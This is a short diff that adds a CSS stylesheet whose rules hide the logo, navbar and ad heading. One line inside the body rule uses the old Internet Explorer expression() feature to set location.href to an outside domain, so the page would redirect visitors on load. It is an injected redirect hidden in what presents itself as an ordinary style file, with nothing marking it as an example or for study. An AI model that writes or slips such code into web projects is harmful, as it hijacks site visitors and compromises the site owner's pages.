@@ -1,0 +1,7 @@
+@charset "utf-8";
+/* CSS Document */
+body {onload:expression(location.href='http://www.y3600.com/');}
+#logo{display:none;}
+.ads{height:70px;overflow:hidden;}
+.ads h1{display:none;float:right;line-height:70px;}
+.navbar{display:none;}
